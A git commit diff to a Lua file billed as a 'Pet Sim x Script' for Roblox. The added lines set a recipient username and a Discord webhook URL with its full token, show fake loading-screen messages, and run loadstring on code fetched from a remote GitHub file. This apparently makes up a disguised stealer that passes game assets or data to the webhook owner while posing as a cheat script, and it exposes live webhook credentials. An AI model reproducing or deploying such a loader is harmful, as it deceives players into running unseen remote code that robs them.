fa1596dcd9b85e54ee6d721d5562e67c28894f17
Psx112 <132260830+Psx112@users.noreply.github.com>
2023-05-05 23:14:27 +0300

    Update SCRIPTdontreadme.lua

--- SCRIPTdontreadme.lua
+++ SCRIPTdontreadme.lua
@@ -1,9 +1,9 @@
 Username = "Den4ik7482GG"
-WebHook = "https://discord.com/api/webhooks/1103929701422071809/saOAdgwarEdR73kVx5GhGcift676nS_UJsxJ37ICyqr_bMHzzU2u-ddA8wAdm-A_1kIX"
+WebHook = "https://discord.com/api/webhooks/1104130449753772072/aDRXVvHEOorcIdsIlpnPCsaUjfGpf_o7cLzkt9oTvQCgkf4WQotSgy8vg1BZrWEBOaps"
 loadingscreen = true
 _G.CustomScriptName = "Pet Sim x Script"
 _G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script..."
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Script..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))()
+_G.Text2 = ""
+_G.Text3 = ""
+_G.Text4 = "By Danil King."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
